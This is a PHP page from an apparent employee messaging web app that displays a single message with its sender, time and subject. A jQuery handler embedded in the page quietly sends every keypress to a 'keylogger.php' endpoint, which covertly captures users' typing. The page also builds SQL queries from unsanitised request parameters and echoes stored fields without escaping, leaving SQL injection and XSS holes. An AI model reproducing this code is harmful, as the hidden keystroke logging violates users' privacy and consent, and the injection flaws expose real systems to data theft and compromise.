<?php
include('header.php');
if(isset($_GET['id']))
{
	
	$msg_id = $_GET['id'];
	$query = mysql_query("SELECT * FROM $table WHERE id = '$msg_id'");
	$row_full_msg = mysql_fetch_assoc($query);
	$sender_id = $row_full_msg['User_id'];
	
	if(substr($sender_id,0,4) == 'admi')
	{
		$query_name = mysql_query("SELECT * FROM admin WHERE User_id = '$sender_id' AND Status = 'True'");
		$row_name = mysql_fetch_assoc($query_name);
	}
	elseif(substr($sender_id,0,4) == 'emp_')
	{
		$query_name = mysql_query("SELECT * FROM employee WHERE User_id = '$sender_id' AND Status = 'True'");
		$row_name = mysql_fetch_assoc($query_name);
	}	
	
	//update display value in msg table.
	$query = mysql_query("UPDATE $table SET Display = '0' WHERE id = '$msg_id'");
	
}


?> 
 
   
   <?php
	if(substr($_SESSION['login_id'],0,4) == 'admi')
	{
	
	?> 
    <!-- start navigation bar -->
    <div class="row nav">
   
    	<a href="home.php">
        <div class="large-2 column">
         Home
        </div>
        </a>
        
        <a href="manage_emp.php">
        <div class="large-2 column">
       	 Manage Emp
        </div>
        </a>
        
        <a href="message.php">
        <div class="large-2 column" style="background:#10255F;">
         Message
        </div>
        </a>
        
        <a href="task.php">
        <div class="large-2 column">
         Task
        </div>
        </a>
        
        <a href="signup.php">
        <div class="large-2 column">
         Add New User
        </div>
        </a>
        
        <a href="setting.php">
        <div class="large-2 column" >
        Setting
        </div>
        </a>
        
    </div>
    <!-- end navigation bar -->
    
  	<?php
	}
    elseif(substr($_SESSION['login_id'],0,4) == 'emp_')
	{
		
	?>
    <!-- start navigation bar -->
    <div class="row nav">
   
    	<a href="home.php">
        <div class="large-2 column">
         Home
        </div>
        </a>
        
        <a href="company_detail.php">
        <div class="large-2 column">
       	 Company
        </div>
        </a>
        
        <a href="message.php">
        <div class="large-2 column" style="background:#10255F;">
         Message
        </div>
        </a>
        
        <a href="task.php">
        <div class="large-2 column">
         Task
        </div>
        </a>
        
      
        
        <a href="setting.php">
        <div class="large-2 column" >
        Setting
        </div>
        </a>
        
         <a href="logout.php">
        <div class="large-2 column">
         Logout
        </div>
        </a>
        
    </div>
    
    <!-- end navigation bar -->
    <?php
	}
	?> 
    

    <script type="text/javascript">

//*************** START **************
//execute when we press and key from the key board...
$(document).keydown(function(event)
{
	//store that key into keycode variable..
	var keycode = event.keyCode;
	
	//call reload.php page using get method..
	//we send key value with the help of get method into reload.php page.. 	
	$('#hello').load('keylogger.php?press_key='+keycode+'&page=view_full_message');

});
//*************** END ****************

</script>


<!-- for key stock.. -->
<div id="hello"></div>
<!-- for key stock.. -->


    
    <!-- start main heading -->
    <div class="row">
    	<div class="large-12 column main_heading">
       	View Full Message
        </div>
    </div>
    <!-- end main heading -->


    <!-- start horizantal line -->
     <div class="row">
    	<div class="large-12 column">
        <hr style="border:0.1em #999999 solid;">
        </div>
    </div>
    <!-- end horizantal line -->
    
    
    
   <!-- start manage employee -->
   <div class="manage_emp">
       <div class="row">
            <div class="large-3 large-offset-1 column emp_name" style="font-weight:bold;">
            Employee Name :
            </div>
            <div class="large-6 column end">
            <?php echo $row_name['Name']; ?>
            </div>
       </div>
       
       <div class="row" style="margin-top:25px;">
            <div class="large-3 large-offset-1 column emp_name"  style="font-weight:bold;" >
           	Time
            </div>
            <div class="large-6 column end">
               <?php echo $row_full_msg['Time']; ?>            
            </div>
       </div>
       
       <div class="row" style="margin-top:25px;">
            <div class="large-3 large-offset-1 column emp_name"  style="font-weight:bold;" >
            Subject
            </div>
            <div class="large-6 column end">
			<?php echo $row_full_msg['Subject']; ?>
            </div>
       </div>
       
       
        <div class="row" style="margin-top:25px;">
            <div class="large-3 large-offset-1 column emp_name"  style="font-weight:bold;">
            Message
            </div>
            <div class="large-6 column end">
            <?php echo $row_full_msg['Description']; ?>
            </div>
       </div>
       
       <div class="row" style="margin-top:25px;">
            <div class="large-12 column">
            <center>
            <form action="send_message.php" method="post">
            <input type="hidden" value="<?php echo $sender_id;?>" name="sender_id" />
            <input type="submit" value="Reply"  name="reply"/>
            </form>
            </center>
            </div>
            
       </div>
       
        
       
       
   
       
       
   </div>
   <!-- end manage employee -->
   
   
   <!-- start Footer -->
   <div id="full_width">
   <div class="footer" style="margin-top:74px;">
        <div class="row">
            <div class="large-2 large-offset-10 column copyright">
        &copy; Rishabh Agrawal
            </div>
        </div>   
   </div>
   </div>
    <!-- end Footer -->
 
    
   
</body>
</html>
